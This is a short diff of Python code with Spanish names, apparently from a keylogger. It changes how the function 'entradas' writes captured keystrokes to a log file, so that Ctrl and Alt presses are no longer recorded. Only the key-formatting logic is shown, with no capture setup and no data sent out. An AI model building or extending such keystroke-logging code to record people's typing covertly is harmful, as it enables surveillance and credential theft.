@@ -42,15 +42,15 @@ def entradas(llave):
     elif llave == 'Key.caps_lock':
         pass
     elif llave == 'Key.ctrl_l' or llave == 'KEY.CTRL_L':
-        p.write(' Left_Ctrl ')
+        pass
     elif llave == 'Key.ctrl_r' or llave == 'KEY.CTRL_R':
-        p.write(' Right_Ctrl ')
+        pass
     elif llave == 'Key.shift' or llave == 'KEY.SHIFT':
         pass
     elif llave == 'Key.alt_l' or llave == 'KEY.ALT_L':
-        p.write(' Left_Alt + ')
+        pass
     elif llave == 'Key.alt_gr' or llave == 'KEY.ALT_GR':
-        p.write(' Right_Alt + ')
+        pass
     elif llave == 'Key.end' or llave == 'KEY.END':
         p.write(' *END KEY* ')
     elif llave == 'Key.tab' or llave == 'KEY.TAB':
